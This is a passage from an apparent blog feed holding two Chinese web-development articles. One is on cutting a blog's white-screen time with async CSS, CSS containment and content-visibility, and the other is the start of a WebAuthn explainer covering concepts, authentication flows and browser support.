height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 \"An API for accessing Public Key Credentials\"，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 